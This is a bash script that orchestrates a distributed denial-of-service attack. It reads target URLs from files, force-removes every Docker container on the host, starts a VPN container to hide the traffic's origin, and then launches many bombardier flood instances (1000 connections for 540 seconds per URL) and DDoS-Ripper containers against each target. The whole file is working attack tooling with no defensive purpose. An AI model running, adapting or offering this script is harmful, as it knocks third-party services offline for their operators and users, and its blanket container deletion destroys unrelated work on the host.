#!/bin/bash
RESOURCES_FILE_BOMB=$1
INSTANCE_PER_BOMB=$2
RESOURCES_FILE_RIPPER=$3
INSTANCE_PER_RIPPER=$4

echo "Bombardier file: $RESOURCES_FILE_BOMB with $INSTANCE_PER_BOMB instances per url"
echo "Ripper file: $RESOURCES_FILE_RIPPER with $INSTANCE_PER_RIPPER instances per url"


echo "Killing all running docker instances..."
sudo docker rm -f $(sudo docker ps -aq) >/dev/null 2>&1 || true
for i in {1..5} ; do
    echo -n '['
    for ((j=0; j<i; j++)) ; do echo -n ' '; done
    echo -n '=>'
    for ((j=i; j<5; j++)) ; do echo -n ' '; done
    echo -n "] $i"0% $'\r'
    sleep 1
done
echo "Killed all instances."


echo "Starting VPN (from docker-compose)..."
sudo docker-compose up -d
for i in {1..15} ; do
    echo -n '['
    for ((j=0; j<i; j++)) ; do echo -n ' '; done
    echo -n '=>'
    for ((j=i; j<15; j++)) ; do echo -n ' '; done
    echo -n "] $i"0% $'\r'
    sleep 1
done
echo "VPN started."


echo "Starting Bombardier instances..."
IFS=$'\n' read -d '' -r -a linesbomb < $RESOURCES_FILE_BOMB
for BOMB in "${linesbomb[@]}"
do
   echo "Starting for $BOMB"
   for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
   do
      {
         sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $BOMB 
      } &> /dev/null
   done
done
echo "Bombardier instances started."


echo "Starting Ripper instances..."
IFS=$'\n' read -d '' -r -a linesripper < $RESOURCES_FILE_RIPPER
for RIP in "${linesripper[@]}"
do
   echo "Starting for $RIP"
   for (( c=1; c<=$INSTANCE_PER_RIPPER; c++ ))
   do
      {
         sudo docker run -d -m 256m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $RIP
      } &> /dev/null
   done
done
echo "Ripper instances started."
